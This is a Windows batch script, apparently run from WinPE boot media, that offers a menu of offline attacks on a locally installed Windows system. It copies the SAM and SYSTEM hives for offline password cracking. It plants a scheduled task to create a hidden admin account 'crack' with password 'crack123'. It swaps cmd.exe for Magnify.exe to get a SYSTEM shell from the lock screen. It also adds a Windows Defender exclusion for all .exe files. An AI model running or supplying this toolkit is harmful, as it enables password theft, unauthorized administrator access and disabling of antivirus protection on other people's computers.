echo off
echo. winPE system is on drive x:
rem. tanks to http://www.it-connect.fr/custpe-comment-installer-vos-propres-outils-dans-winpe/#II_Comment_connaitre_la_lettre_du_media_WinPE
FOR %%i IN (C D E F G H I J K L M N O P Q R S T U V W Y Z) DO IF EXIST %%i:\SOURCES\Boot.wim SET MEDIAPE=%%i:
echo. winPE device is on drive %MEDIAPE%


for %%a in (A B C D E F G H I J K L M N O P Q R S T U V W Y Z) do @if exist %%a:\Users\ set win=%%a:
echo. local system is on drive: %win%

pause

REM.-- Prepare the Command Processor
SETLOCAL ENABLEEXTENSIONS
SETLOCAL ENABLEDELAYEDEXPANSION

:menu
cls
echo.                      ######  ####### 
echo.  #####    ##   ##### #     # #
echo.  #    #  #  #    #   #     # # 
echo.  #####  #    #   #   ######  ##### 
echo.  #    # ######   #   #   #   # 
echo.  #    # #    #   #   #    #  # 
echo.  #####  #    #   #   #     # ####### 
echo.
echo.
echo. please chose an option : 
echo. dump  = dump sam and system files, in order to crack passwords offline
echo. impersonate = impersonate task in order to create an admin account
echo. bypass_pass = exange cmd.exe and magnify.exe to open a cmd with autorite NT/system account with a locked computer
echo. bypass_pass_end = revert the exange of cmd.exe and magnify.exe
echo. windef = deactivation/activation of windows defender (add an exclusion for *.exe)
echo. reboot = reboot the computer (if no options are chose, we reboot the computer)

set /p choix= :

if  "%choix%"=="dump"  (goto :A)
if  "%choix%"=="impersonate"  (goto :B)
if  "%choix%"=="bypass_pass"  (goto :C)
if  "%choix%"=="bypass_pass_end"  (goto :D)
if  "%choix%"=="windef"  (goto :E)
if  "%choix%"=="reboot"  (goto :REBOOT)
goto REBOOT

:A
cls
echo. we copy %win%\windows\system32\config\SAM and %win%\windows\system32\config\SYSTEM to %MEDIAPE%\sam\SAM and %MEDIAPE%\system\SYSTEM
echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
pause
echo. %win%\windows\system32\config\SAM to %win%\windows\system32\config\SYSTEM
copy %win%\windows\system32\config\SAM %MEDIAPE%\sam\SAM
copy %win%\windows\system32\config\SYSTEM %MEDIAPE%\system\SYSTEM
echo. comands ok
pause
goto menu


:B
cls
echo. this will create an admin account on the system. (windows 10 and above)
echo. the user is crack, and the password is crack123 
echo. I load hklm\software of the local machine
reg load HKLM\tmp %win%\windows\system32\config\SOFTWARE
echo. I add the schtask
reg import %MEDIAPE%\reg\boot.reg
reg import %MEDIAPE%\reg\task.reg
reg import %MEDIAPE%\reg\tree.reg
echo. I copy the schtask on the harddisk (automatically deleted after the execution)
copy %MEDIAPE%\reg\schadmcrack %win%\Windows\System32\Tasks\schadmcrack
mkdir %win%\schadmcrack
echo. Add or Delete ?
set /p choi=A/D

if  "%choi%"=="A"  (goto :on)
if  "%choi%"=="D"  (goto :off)


:on
copy %MEDIAPE%\reg\script.bat %win%\windows\temp\script.bat
copy %MEDIAPE%\reg\test.ps1 %win%\windows\temp\test.ps1
pause
echo. first reboot
goto :REBOOT

:off
copy %MEDIAPE%\reg\script1.bat %win%\windows\temp\script.bat
pause
echo. first reboot
goto :REBOOT

:C
pause 
echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
pause
echo. I rename %win%\Windows\System32\Magnify.exe to %win%\Windows\System32\Magnify2.exe
rename %win%\Windows\System32\Magnify.exe Magnify2.exe
echo. I rename %win%\Windows\System32\cmd.exe to %win%\Windows\System32\Magnify.exe
rename %win%\Windows\System32\cmd.exe %win%\Windows\System32\Magnify.exe

:D
cls
echo. this will revert the changes of bypass_pass
echo. confirm? to close the widow use alt+space+down arrow or ctrl+c
pause
rename %win%\Windows\System32\Magnify.exe cmd.exe
rename %win%\Windows\System32\Magnify2.exe Magnify.exe
echo. comands ok
echo. ready for reboot ?
pause
goto :REBOOT

:E
echo. I load the register hklm/software of the local system
reg load HKLM\tmp %win%\windows\system32\config\SOFTWARE
echo. add the .exe exclusion or delete ?
set /p choixx=A/D
if  "%choixx%"=="A"  (goto :add)
if  "%choixx%"=="D"  (goto :delete)

:add
reg import %MEDIAPE%\reg\windefext.reg
pause
goto :menu

:delete
reg delete "HKLM\tmp\Microsoft\Windows Defender\Exclusions\Extensions" /v exe
pause
goto :menu

:REBOOT
echo off
Wpeutil Reboot
pause